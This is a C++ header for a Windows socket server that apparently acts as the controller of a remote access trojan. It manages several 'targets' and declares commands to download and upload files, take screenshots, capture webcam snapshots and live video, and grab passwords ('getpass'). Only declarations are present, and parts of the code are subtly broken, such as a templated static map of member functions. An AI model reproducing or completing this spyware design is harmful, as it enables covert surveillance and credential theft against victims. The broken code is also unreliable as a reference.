#ifndef SERVER_HPP
#define SERVER_HPP

#undef UNICODE
#include <WinSock2.h>
#include <unordered_map>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <sstream>
#include <cstdio>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <tchar.h>
#include <strsafe.h>
#include <codecvt>
#define BUFFER_SIZE (2048)


struct Commands
{
    // SERVER CUSTOM COMMAND FUNCTIONS
    void print_help();
    void clear_screen();
    void download(char* filefrom, char* fileto);
    void upload(char* filefrom, char* fileto);
    void screenshot(char* outpath);
    void webcam_snap(char* output);
    void livecam();
    void getpass();
};


class Server : Commands
{
public:
    std::wstring lport;
    std::string lport_str;

public:
    // SOCKET
    void initialize();
    void create_socket();
    void bind_socket();
    void accept_connections();
    int quit_gracefully();

    // HANDLER
    void start_handler();
    void handler_print_help();
    void list_connections();
    bool change_target(unsigned short int target);

    // MAIN
    BOOL OnSocketOutput();
    BOOL ReadFromSocket();
    int send_commands();

private:
    // SOCKET INFO
    WSADATA wsaData;
    struct addrinfo* AddrInfo;
    struct addrinfo hints;

    // SOCKET CREATE
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    // DATA
    int iResult;
    int iSendResult;
    char rdata[BUFFER_SIZE];
    char inputUser[BUFFER_SIZE];
    DWORD dwSockRead;
    DWORD dwSockWrite;
    BOOL bRunning;
    HANDLE hProcRead;
    HANDLE hProcWrite;

    // VECTORS
    std::vector<SOCKET> all_connections;
    std::vector<std::vector<LPCSTR>> all_addresses;

private: 
    // COMMAND LOOKUP
    template <typename T>
    static std::unordered_map <std::string, T> command_lookup = {
        {"shellhelp", print_help },
        {"clear", clear_screen },
        {"download", download},
        {"upload", upload},
        {"screenshot", screenshot},
        {"webcam", webcam_snap},
        {"livecam", livecam},
        {"getpass", getpass}
    };
};

#endif //SERVER_HPP
